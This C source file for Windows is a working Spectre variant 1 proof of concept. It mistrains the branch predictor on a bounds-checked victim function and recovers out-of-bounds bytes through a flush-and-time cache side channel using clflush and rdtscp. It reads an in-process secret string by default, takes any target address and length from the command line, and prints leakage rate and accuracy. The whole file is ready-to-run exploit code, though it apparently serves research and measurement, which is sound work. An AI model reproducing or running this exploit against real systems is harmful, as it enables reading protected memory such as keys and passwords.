#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h> // For QueryPerformanceCounter
#ifdef _MSC_VER
#include <intrin.h> // for rdtscp and clflush 
#pragma optimize("gt", on)
#else
#include <x86intrin.h> // for rdtscp and clflush 
#endif

/********************************************************************
Victim code
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512]; // Probe array used as the side channel 

char *secret = 
    "Secret string";

uint8_t temp = 0; /* Used to prevent the compiler from optimizing out the victim function */

void victim_function(size_t x) {
    if (x < array1_size) { 
        temp &= array2[array1[x] * 512]; 
    }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = 200; tries > 0; tries--) {
        // Flush array2[0..255 * 512] from cache 
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        //30 calls per attack run: 5 trainings per 1 malicious call 
        training_x = tries % array1_size;
        for (i = 29; i >= 0; i--) {
            _mm_clflush(&array1_size); // Ensure cache miss for bounds check 
            for (volatile int z = 0; z < 100; z++) {} // Delay loop to wait for flush 

            x = ((i % 6) - 1) & ~0xFFFF; 
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);
        }

        // Time reads to detect which index of array2 was cached 
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255; // Mixed-up order to prevent stride prediction
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);         // Read timer
            junk = *addr;                    // Memory access
            time2 = __rdtscp(&junk) - time1; // Compute elapsed time 

            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; // Record a hit
        }

        // Locate highest and second-highest results
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (results[k] + 2) && results[j] > 4)
            break; // Success if best is significantly better than runner-up 
    }
    results[0] ^= junk; // Prevent optimization
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv) {
    size_t malicious_x = (size_t)(secret - (char *)array1); // Default malicious_x
    int original_len = (int)strlen(secret); // STORE THIS SEPARATELY
    int len = original_len;
    int i, score[2];
    uint8_t value[2];
    int correct_count = 0;

    for (i = 0; i < (int)sizeof(array2); i++) array2[i] = 1; // Ensure array2 is backed by memory

    if (argc == 3) {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; // Relative to array1 
        sscanf(argv[2], "%d", &len);
    }

    // Windows Timing Variables
    LARGE_INTEGER frequency, start_time, end_time;
    QueryPerformanceFrequency(&frequency);

    printf("Reading %d bytes:\n", len);
    // Start stopwatch
    QueryPerformanceCounter(&start_time);

    for (int i = 0; i < len; i++) {
        printf("Reading at malicious_x=%p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0) printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
        if(value[0] == (uint8_t)secret[i])
            correct_count++;
    }
    // End stopwatch
    QueryPerformanceCounter(&end_time);

    // --- Metrics Calculation ---
    double elapsed_seconds = (double)(end_time.QuadPart - start_time.QuadPart) / frequency.QuadPart;
    double leakage_rate = (double)original_len / elapsed_seconds; // Bytes per second
    double accuracy = ((double)correct_count / original_len) * 100.0;

    printf("\n--- Evaluation Metrics ---\n");
    printf("Total Time   : %.4f seconds\n", elapsed_seconds);
    printf("Leakage Rate : %.2f bytes/sec\n", leakage_rate);
    printf("Accuracy     : %.2f%% (%d/%d bytes correct)\n", accuracy, correct_count, original_len);

    return (0);
}